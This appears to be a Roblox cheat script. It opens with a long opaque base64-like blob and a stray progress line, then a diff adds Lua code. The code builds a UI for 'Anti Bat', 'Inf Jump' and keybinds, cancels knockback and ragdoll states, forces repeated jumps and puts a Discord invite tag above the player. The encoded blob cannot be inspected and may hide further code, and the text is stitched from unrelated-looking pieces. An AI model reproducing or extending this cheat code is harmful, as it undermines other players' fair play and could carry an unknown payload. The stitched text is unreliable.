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
-... (Tiempo restante: 700 KB)
+local mobileSizeCard, mobilePercent, mobileMinus, mobilePlus = sizeCard(mobileContent, 200, true)
+
+-- PC rows: same features, with the original toggle-style layout.
+local pcRowY = 0
+local function pcRow(height)
+    local y = pcRowY
+    pcRowY = pcRowY + height + 7
+    local row = new("Frame", {
+        ZIndex = 4,
+        Position = UDim2.new(0, 0, 0, y),
+        Size = UDim2.new(1, 0, 0, height),
+        BackgroundColor3 = C.panel,
+        BackgroundTransparency = 0.12,
+        BorderSizePixel = 0,
+    }, pcContent)
+    corner(row, 11)
+    stroke(row, C.accent, 1.1, 0.4)
+    return row
+end
+
+local logicRow = pcRow(38)
+local logicLabel = new("TextLabel", {
+    ZIndex = 5,
+    Position = UDim2.new(0, 12, 0, 0),
+    Size = UDim2.new(0.35, 0, 1, 0),
+    BackgroundTransparency = 1,
+    Text = "Logic",
+    TextColor3 = C.white,
+    TextSize = 12,
+    Font = font("GothamBold"),
+    TextXAlignment = Enum.TextXAlignment.Left,
+}, logicRow)
+
+local function versionButton(text, rightOffset)
+    local btn = new("TextButton", {
+        ZIndex = 6,
+        AnchorPoint = Vector2.new(1, 0.5),
+        Position = UDim2.new(1, -rightOffset, 0.5, 0),
+        Size = UDim2.new(0, 38, 0, 24),
+        BackgroundColor3 = C.card,
+        Text = text,
+        TextColor3 = C.white,
+        TextSize = 12,
+        Font = font("GothamBlack"),
+        AutoButtonColor = false,
+    }, logicRow)
+    corner(btn, 7)
+    local s = stroke(btn, text == "V1" and C.v1 or C.v2, 1, 0.5)
+    return btn, s
+end
+
+local pcV1, pcV1Stroke = versionButton("V1", 92)
+local pcV2, pcV2Stroke = versionButton("V2", 48)
+
+local function toggleRow(labelText, yHeight, trackWidth, trackHeight, knobSize)
+    local row = pcRow(yHeight)
+    local label = new("TextLabel", {
+        ZIndex = 5,
+        Position = UDim2.new(0, 12, 0, 6),
+        Size = UDim2.new(0.55, 0, 0, 16),
+        BackgroundTransparency = 1,
+        Text = labelText,
+        TextColor3 = C.white,
+        TextSize = 13,
+        Font = font("GothamBold"),
+        TextXAlignment = Enum.TextXAlignment.Left,
+    }, row)
+
+    local status = new("TextLabel", {
+        ZIndex = 5,
+        Position = UDim2.new(0, 12, 0, 24),
+        Size = UDim2.new(0.4, 0, 0, 14),
+        BackgroundTransparency = 1,
+        Text = "OFF",
+        TextColor3 = C.muted,
+        TextSize = 11,
+        Font = font("Gotham"),
+        TextXAlignment = Enum.TextXAlignment.Left,
+    }, row)
+
+    local track = new("Frame", {
+        ZIndex = 5,
+        AnchorPoint = Vector2.new(1, 0.5),
+        Position = UDim2.new(1, -12, 0.5, 0),
+        Size = UDim2.new(0, trackWidth, 0, trackHeight),
+        BackgroundColor3 = C.dark,
+        BorderSizePixel = 0,
+    }, row)
+    corner(track, math.floor(trackHeight / 2))
+
+    local knob = new("Frame", {
+        ZIndex = 6,
+        Position = UDim2.new(0, 3, 0.5, -knobSize / 2),
+        Size = UDim2.new(0, knobSize, 0, knobSize),
+        BackgroundColor3 = C.white,
+        BorderSizePixel = 0,
+    }, track)
+    corner(knob, math.floor(knobSize / 2))
+
+    local hit = new("TextButton", {
+        ZIndex = 8,
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundTransparency = 1,
+        Text = "",
+    }, row)
+
+    return row, status, track, knob, hit, trackWidth, knobSize
+end
+
+local antiRow, antiStatus, antiTrack, antiKnob, antiHit, antiTrackW, antiKnobSize =
+    toggleRow("Anti Bat", 44, 46, 24, 16)
+local keyRow = pcRow(44)
+local keyLabel = new("TextLabel", {
+    ZIndex = 5,
+    Position = UDim2.new(0, 12, 0.5, -9),
+    Size = UDim2.new(0.4, 0, 0, 18),
+    BackgroundTransparency = 1,
+    Text = "Keybind",
+    TextColor3 = C.white,
+    TextSize = 13,
+    Font = font("GothamBold"),
+    TextXAlignment = Enum.TextXAlignment.Left,
+}, keyRow)
+local pcKey = new("TextButton", {
+    ZIndex = 6,
+    AnchorPoint = Vector2.new(1, 0.5),
+    Position = UDim2.new(1, -12, 0.5, 0),
+    Size = UDim2.new(0, 86, 0, 28),
+    BackgroundColor3 = C.card,
+    Text = state.Keybind.Name,
+    TextColor3 = C.white,
+    TextSize = 12,
+    Font = font("GothamBlack"),
+    AutoButtonColor = false,
+}, keyRow)
+corner(pcKey, 8)
+stroke(pcKey, C.accent, 1, 0.3)
+
+local infRow, infStatus, infTrack, infKnob, infHit, infTrackW, infKnobSize =
+    toggleRow("Inf Jump", 44, 44, 22, 14)
+local pcSizeCard, pcPercent, pcMinus, pcPlus = sizeCard(pcContent, pcRowY, false)
+
+-- ---------------------------------------------------------------------------
+-- Safe character guard. No 1000-stud impulse, no anchoring, no input disabling.
+-- ---------------------------------------------------------------------------
+
+local connections = {}
+local guardConnection = nil
+local lastVelocity = Vector3.new(0, 0, 0)
+local spaceHeld = false
+local lastInfJump = 0
+
+local function track(conn)
+    table.insert(connections, conn)
+    return conn
+end
+
+local function getCharacter()
+    local character = player.Character
+    if not character then return nil, nil, nil end
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    local root = character:FindFirstChild("HumanoidRootPart")
+    if not root and humanoid then root = humanoid.RootPart end
+    return character, humanoid, root
+end
+
+local function getVelocity(root)
+    local ok, velocity = pcall(function()
+        return root.AssemblyLinearVelocity
+    end)
+    if ok and typeof(velocity) == "Vector3" then
+        return velocity
+    end
+    return root.Velocity
+end
+
+local function setVelocity(root, velocity)
+    local ok = pcall(function()
+        root.AssemblyLinearVelocity = velocity
+    end)
+    if not ok then
+        pcall(function()
+            root.Velocity = velocity
+        end)
+    end
+end
+
+local function setAngularVelocity(root, velocity)
+    local ok = pcall(function()
+        root.AssemblyAngularVelocity = velocity
+    end)
+    if not ok then
+        pcall(function()
+            root.RotVelocity = velocity
+        end)
+    end
+end
+
+local function enableControls()
+    pcall(function()
+        local playerScripts = player:FindFirstChild("PlayerScripts")
+        if not playerScripts then return end
+        local playerModule = playerScripts:FindFirstChild("PlayerModule")
+        if not playerModule then return end
+        local controlModule = playerModule:FindFirstChild("ControlModule")
+        if not controlModule then return end
+        require(controlModule):Enable()
+    end)
+end
+
+local function reenableMotors(character)
+    for _, descendant in ipairs(character:GetDescendants()) do
+        if descendant:IsA("Motor6D") and not descendant.Enabled then
+            descendant.Enabled = true
+        end
+    end
+end
+
+local function isRagdollState(humanoid)
+    local s = humanoid:GetState()
+    return s == Enum.HumanoidStateType.Physics
+        or s == Enum.HumanoidStateType.Ragdoll
+        or s == Enum.HumanoidStateType.FallingDown
+end
+
+local function guardStep(dt)
+    local character, humanoid, root = getCharacter()
+    if not character or not humanoid or not root or humanoid.Health <= 0 then
+        return
+    end
+
+    local velocity = getVelocity(root)
+    local delta = (velocity - lastVelocity).Magnitude
+    local ragdoll = isRagdollState(humanoid)
+    local suddenHit = delta > SAFE_GUARD.SpikeDelta and dt > 0 and dt < SAFE_GUARD.MaxFrameDelta
+
+    if ragdoll and SAFE_GUARD.RecoverRagdoll then
+        pcall(function()
+            humanoid:ChangeState(Enum.HumanoidStateType.Running)
+        end)
+        local camera = workspace.CurrentCamera
+        if camera then camera.CameraSubject = humanoid end
+        enableControls()
+        setVelocity(root, Vector3.new(0, 0, 0))
+        setAngularVelocity(root, Vector3.new(0, 0, 0))
+        reenableMotors(character)
+    elseif suddenHit then
+        -- Preserve the player's current movement input instead of freezing them.
+        local intended = humanoid.MoveDirection * humanoid.WalkSpeed
+        local safeY = clamp(velocity.Y, -SAFE_GUARD.MaxVerticalAfterHit, SAFE_GUARD.MaxVerticalAfterHit)
+        setVelocity(root, Vector3.new(intended.X, safeY, intended.Z))
+        setAngularVelocity(root, Vector3.new(0, 0, 0))
+    end
+
+    lastVelocity = getVelocity(root)
+end
+
+local function startGuard()
+    if guardConnection then return end
+    local _, _, root = getCharacter()
+    lastVelocity = root and getVelocity(root) or Vector3.new(0, 0, 0)
+    guardConnection = RunService.Heartbeat:Connect(guardStep)
+end
+
+local function stopGuard()
+    if guardConnection then
+        guardConnection:Disconnect()
+        guardConnection = nil
+    end
+end
+
+local function infJumpStep()
+    if not state.InfJump or not spaceHeld then return end
+    local now = os.clock()
+    if now - lastInfJump < 0.22 then return end
+
+    local _, humanoid = getCharacter()
+    if not humanoid or humanoid.Health <= 0 then return end
+
+    local s = humanoid:GetState()
+    local allowed = state.LogicVersion == 1
+        or s == Enum.HumanoidStateType.Jumping
+        or s == Enum.HumanoidStateType.Freefall
+    if allowed then
+        lastInfJump = now
+        pcall(function()
+            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+        end)
+    end
+end
+
+track(RunService.Heartbeat:Connect(infJumpStep))
+
+track(UserInputService.JumpRequest:Connect(function()
+    if not state.InfJump then return end
+    local _, humanoid = getCharacter()
+    if not humanoid or humanoid.Health <= 0 then return end
+    local s = humanoid:GetState()
+    if state.LogicVersion == 1 or s == Enum.HumanoidStateType.Jumping or s == Enum.HumanoidStateType.Freefall then
+        pcall(function()
+            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+        end)
+    end
+end))
+
+track(player.CharacterAdded:Connect(function()
+    lastVelocity = Vector3.new(0, 0, 0)
+    task.wait(0.3)
+    if state.AntiBat then
+        stopGuard()
+        startGuard()
+    end
+end))
+
+-- Optional original-style Discord tag above the character.
+local function addDiscordTag(character)
+    task.wait(0.5)
+    local head = character:FindFirstChild("Head")
+    local root = character:FindFirstChild("HumanoidRootPart")
+    local adornee = head or root
+    if not adornee then return end
+    if adornee:FindFirstChild("Mouad_DiscordTag") then return end
+
+    local tag = new("BillboardGui", {
+        Name = "Mouad_DiscordTag",
+        Size = UDim2.new(0, 250, 0, 36),
+        StudsOffset = Vector3.new(0, 3.9, 0),
+        MaxDistance = 250,
+        AlwaysOnTop = false,
+    }, adornee)
+
+    new("TextLabel", {
+        Size = UDim2.new(1, 0, 1, 0),
+        BackgroundTransparency = 1,
+        Text = DISCORD_INVITE,
+        TextColor3 = C.accent2,
+        TextStrokeTransparency = 0.4,
+        TextSize = 14,
+        Font = font("GothamBold"),
+    }, tag)
+end
+
+if player.Character then task.spawn(addDiscordTag, player.Character) end
+track(player.CharacterAdded:Connect(function(character)
+    task.spawn(addDiscordTag, character)
+end))
+
+-- ---------------------------------------------------------------------------
+-- UI state / events
+-- ---------------------------------------------------------------------------
+
+local bindingKey = false
+local dragging = false
+local dragStart = nil
+local startPosition = nil
+
+local updateLogicUI
+local updateAntiUI
+local updateInfUI
+local updateKeyUI
+local updateLockUI
+local updateModeUI
+local updateScaleUI
+local setCollapsed
+
+local function tween(obj, props)
+    local ok, t = pcall(function()
+        return TweenService:Create(obj, TweenInfo.new(0.15), props)
+    end)
+    if ok and t then t:Play() end
+end
+
+-- Activated works for mouse, touch, and gamepad; it avoids mobile taps being missed.
+local function onClick(button, callback)
+    return button.Activated:Connect(callback)
+end
+
+local function setAntiBat(enabled)
+    state.AntiBat = enabled and true or false
+    if state.AntiBat then startGuard() else stopGuard() end
+    if updateAntiUI then updateAntiUI() end
+    saveConfig()
+end
+
+local function setInfJump(enabled)
+    state.InfJump = enabled and true or false
+    if updateInfUI then updateInfUI() end
+    saveConfig()
+end
+
+local function setLogicVersion(version)
